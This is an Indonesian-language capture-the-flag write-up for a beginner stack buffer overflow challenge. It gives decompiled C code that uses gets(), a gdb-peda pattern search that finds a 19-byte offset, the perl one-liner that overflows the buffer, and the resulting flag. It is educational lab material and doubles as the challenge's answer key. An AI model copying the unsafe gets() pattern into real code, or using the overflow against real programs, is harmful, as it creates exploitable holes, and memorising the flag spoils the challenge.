Challenge kali ini sangat mudah, kalian hanya tinggal menginput. Trus sudah :D.

Hint: Jika ingin tau bagaimana proses bufferoverflow nya silahkan pakai GDB atau bisa belajar dari youtube channel bernama LiveOverflow

Download : https://mega.nz/#!xwZD0SaY!T-HoML7JyYitHNBV2zNn_xL2ERp5T7JdppAgKxeuyOY

Psudeo Code
```C
undefined8 main(void)

{
  undefined4 local_a8 [4];
  undefined4 local_98;
  undefined4 local_94;
  undefined4 local_90;
  undefined4 local_8c;
  undefined4 local_88;
  undefined4 local_84;
  undefined4 local_80;
  undefined4 local_7c;
  undefined4 local_78;
  undefined4 local_74;
  undefined4 local_70;
  undefined4 local_6c;
  undefined4 local_68;
  undefined4 local_64;
  undefined4 local_60;
  undefined4 local_5c;
  undefined4 local_58;
  undefined4 local_54;
  undefined4 local_50;
  undefined4 local_4c;
  undefined4 local_48;
  undefined4 local_44;
  undefined4 local_40;
  undefined4 local_3c;
  undefined4 local_38;
  undefined4 local_34;
  undefined4 local_30;
  undefined4 local_2c;
  undefined4 local_28;
  undefined4 local_24;
  undefined4 local_20;
  char local_1c [12];
  int local_10;
  int local_c;
  
  puts("Welcome to CTFR");
  puts("Welcome to Bufferoverflow, your buffer size is a way to decode flag inside this app!");
  local_10 = 0;
  gets(local_1c);
  if (local_10 == 0) {
    puts("You are still not buffering this!");
  }
  else {
    local_a8[0] = 0x33;
    local_a8[1] = 0x44;
    local_a8[2] = 0x36;
    local_a8[3] = 0x42;
    local_98 = 0x6b;
    local_94 = 0x5e;
    local_90 = 0x20;
    local_8c = 0x67;
    local_88 = 0x4f;
    local_84 = 0x69;
    local_80 = 0x20;
    local_7c = 0x65;
    local_78 = 0x4f;
    local_74 = 0x5c;
    local_70 = 0x23;
    local_6c = 0x24;
    local_68 = 0x62;
    local_64 = 0x5e;
    local_60 = 0x21;
    local_5c = 0x5e;
    local_58 = 0x29;
    local_54 = 0x4f;
    local_50 = 0x52;
    local_4c = 0x65;
    local_48 = 0x56;
    local_44 = 0x56;
    local_40 = 0x23;
    local_3c = 0x62;
    local_38 = 0x4f;
    local_34 = 99;
    local_30 = 100;
    local_2c = 0x24;
    local_28 = 0x53;
    local_24 = 0x5b;
    local_20 = 0x6d;
    puts("Here is your flag : ");
    local_c = 0;
    while (local_c < 0x23) {
      printf("%c",(long)(char)local_a8[local_c] + 0x10);
      local_c = local_c + 1;
    }
    putchar(10);
  }
  return 0;
}
```

Proses Cari Offset Buffer

```bash
$ gdb -q buff2
gdb-peda$ pattern create 200
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA
gdb-peda$ r
Starting program: /root/work/Reverse Engineering/Bufferoverflow #2/buff2 
Welcome to CTFR
Welcome to Bufferoverflow, your buffer size is a way to decode flag inside this app!
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'
Legend: code, data, rodata, heap, value
Stopped reason: SIGSEGV
0x00005555555553a5 in main ()

gdb-peda$ pattern search
Registers contain pattern buffer:
RBP+0 found at offset: 19
Registers point to pattern buffer:
[RSP] --> offset 27 - size ~174
Pattern buffer found at:
0x000055555556b281 : offset    0 - size  200 ([heap])
0x00007ffff7bf6bb9 : offset 33208 - size    4 (/usr/lib/x86_64-linux-gnu/libm-2.29.so)
0x00007fffffffe59d : offset    0 - size   15 ($sp + -0x1b [-7 dwords])
0x00007fffffffe5b0 : offset   19 - size  181 ($sp + -0x8 [-2 dwords])
0x00007fffffffe87f : offset 31579 - size    4 ($sp + 0x2c7 [177 dwords])
0x00007fffffffe906 : offset 31579 - size    4 ($sp + 0x34e [211 dwords])
0x00007fffffffef95 : offset 31579 - size    4 ($sp + 0x9dd [631 dwords])
0x00007fffffffefcf : offset 31579 - size    4 ($sp + 0xa17 [645 dwords])
References to pattern buffer found at:
0x00007fffffffe420 : 0x00007fffffffe5b0 ($sp + -0x198 [-102 dwords])
0x00007fffffffe4e8 : 0x00007fffffffe5b0 ($sp + -0xd0 [-52 dwords])
```

Buffer terjadi di `RBP+0 found at offset: 19`

```bash
perl -e "print 'A' x 19" | ./buff2
Welcome to CTFR
Welcome to Bufferoverflow, your buffer size is a way to decode flag inside this app!
Here is your flag : 
CTFR{n0w_y0u_l34rn1n9_buff3r_st4ck}
```

Flag

```
CTFR{n0w_y0u_l34rn1n9_buff3r_st4ck}
```
